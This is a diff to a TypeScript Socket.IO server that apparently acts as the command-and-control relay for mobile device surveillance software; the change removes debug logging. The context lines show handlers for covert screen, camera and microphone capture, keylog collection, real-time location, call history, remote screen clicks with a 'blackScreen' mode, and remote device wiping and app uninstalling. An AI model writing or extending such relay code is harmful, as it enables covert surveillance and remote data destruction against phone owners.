@@ -119,7 +119,6 @@ export const startSocketIO = async () => {
 				`${SocketIOPublicEvents.ADD_NEW_DEVICE}`,
 				async (device: DeviceModelType) => {
 					try {
-						console.log("add device:", device);
 						const res = await addNewDeviceInfo(device);
 
 						if (res?.success === true) {
@@ -213,7 +212,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId } = data;
-						console.log("screen monitor=>", deviceId);
 
 						// Send ScreenMonitor requestion into mobile app
 						io.emit(
@@ -256,7 +254,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, quality } = data;
-						console.log("screen quality monitor=>", deviceId);
 
 						// Send quality requestion into mobile app
 						io.emit(
@@ -299,7 +296,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId } = data;
-						console.log("screen refresh monitor=>", deviceId);
 
 						// Send refresh requestion into mobile app
 						io.emit(
@@ -320,7 +316,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, event } = data;
-						console.log("screen scroll monitor=>", deviceId, event);
 
 						// Send scroll requestion into mobile app
 						io.emit(
@@ -404,8 +399,6 @@ export const startSocketIO = async () => {
 					try {
 						const { deviceId, message } = data;
 
-						console.log("screen send text:", data);
-
 						// Send Text requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_SCREEN_SEND_TEXT}-${deviceId}`,
@@ -426,12 +419,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, cameraType, qualityType } = data;
-						console.log(
-							"Camera Monitor Requesting =>",
-							deviceId,
-							cameraType,
-							qualityType
-						);
 						// Send Camera Monitor requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_CAMERA_MONITOR}-${deviceId}`,
@@ -457,13 +444,6 @@ export const startSocketIO = async () => {
 						const qualityType = response.qualityType;
 						const base64Image = response.base64Image;
 
-						console.log(
-							"Camera Monitor Response=>",
-							deviceId,
-							cameraType,
-							qualityType
-						);
-
 						io.emit(
 							`${SocketIOPublicEvents.CAMERA_SHARE}-${deviceId}`,
 							{
@@ -485,7 +465,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, micType } = data;
-						console.log("mic monitor=>", deviceId, micType);
 
 						// Send Mic Monitor requestion into mobile app
 						io.emit(
@@ -511,7 +490,6 @@ export const startSocketIO = async () => {
 						const deviceId = response.deviceId;
 						const micType = response.micType;
 						const base64Audio = response.base64Audio;
-						console.log("mic response=>", deviceId, micType);
 
 						io.emit(
 							`${SocketIOPublicEvents.MIC_SHARE}-${deviceId}`,
@@ -533,7 +511,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId } = data;
-						console.log("Key logs requesting=>", deviceId);
 						// Send Key logs requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_KEY_LOGS}-${deviceId}`,
@@ -551,7 +528,6 @@ export const startSocketIO = async () => {
 				`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
 				async (response: any) => {
 					try {
-						console.log("Key logs=>", response);
 						const deviceId = response.deviceId;
 						const keyLogsType = response.keyLogsType;
 						const keylogs = response.keylogs;
@@ -592,10 +568,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId } = data;
-						console.log(
-							"Real Time Location Requesting=>",
-							deviceId
-						);
 						// Send real-location requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_LOCATION_MONITOR}-${deviceId}`,
@@ -617,12 +589,7 @@ export const startSocketIO = async () => {
 						const deviceId = response.deviceId;
 						const lat = response.lat;
 						const lng = response.lng;
-						console.log(
-							"Real Time Location Response=>",
-							deviceId,
-							lat,
-							lng
-						);
+
 						io.emit(
 							`${SocketIOPublicEvents.LOCATION_SHARE}-${deviceId}`,
 							{
@@ -665,8 +632,6 @@ export const startSocketIO = async () => {
 						const deviceId = response.deviceId;
 						const data = response.data;
 
-						console.log("New Application Response", response);
-
 						io.emit(
 							`${SocketIOPublicEvents.APP_SHARED}-${deviceId}`,
 							{
@@ -686,7 +651,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId } = data;
-						console.log("Call History Requesting=>", deviceId);
 						// Send call history requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_CALL_HISTORY_MONITOR}-${deviceId}`,
@@ -706,8 +670,6 @@ export const startSocketIO = async () => {
 				async (response: any) => {
 					try {
 						const deviceId = response.deviceId;
-
-						console.log("New Call History Response", response);
 
 						// const res = await addNewCallHistory(response);
 
@@ -874,12 +836,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, xPosition, yPosition } = data;
-						console.log(
-							"Screen Control Click Event Requesting =>",
-							deviceId,
-							xPosition,
-							yPosition
-						);
 						// Send Screen Control requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_SCREEN_CLICK_EVENT}-${deviceId}`,
@@ -901,11 +857,7 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, positions } = data;
-						console.log(
-							"Screen Control Drag Event Requesting =>",
-							deviceId,
-							positions
-						);
+
 						// Send Screen Control requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_SCREEN_DRAG_EVENT}-${deviceId}`,
@@ -926,13 +878,7 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { type, deviceId, status, message } = data;
-						console.log(
-							"Screen Control Setting Event Requesting =>",
-							type,
-							deviceId,
-							status,
-							message
-						);
+
 						// Send Screen Control Setting requestion into mobile app
 						const screenEvent =
 							type === "blackScreen"
@@ -1036,7 +982,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId } = data;
-						console.log("device format:", deviceId);
 
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_DEVICE_FORMAT_EVENT}-${deviceId}`,
@@ -1056,7 +1001,6 @@ export const startSocketIO = async () => {
 				async (response: any) => {
 					try {
 						const deviceId = response.deviceId;
-						console.log("deviec formatted:", deviceId);
 
 						io.emit(
 							`${SocketIOPublicEvents.DEVICE_FORMAT_SHARED}-${deviceId}`,
@@ -1077,7 +1021,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId } = data;
-						console.log("uninstall app:", deviceId);
 
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_UNINSTALL_APP_EVENT}-${deviceId}`,
@@ -1098,7 +1041,6 @@ export const startSocketIO = async () => {
 				async (response: any) => {
 					try {
 						const deviceId = response.deviceId;
-						console.log("uninstall app result:", deviceId);
 
 						io.emit(
 							`${SocketIOPublicEvents.UNINSTALL_APP_SHARED}-${deviceId}`,
@@ -1119,7 +1061,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, event } = data;
-						console.log("screen control:", deviceId, event);
 
 						io.emit(`mb-${event}-${deviceId}`, {
 							deviceId: deviceId,
@@ -1137,7 +1078,6 @@ export const startSocketIO = async () => {
 					try {
 						if (data && data?.deviceId) {
 							// Emit the monitor close
-							console.log("monitor close", data);
 							io.emit(`mb-monitor-close-${data.deviceId}`, {
 								deviceId: data.deviceId,
 								type: data.type,
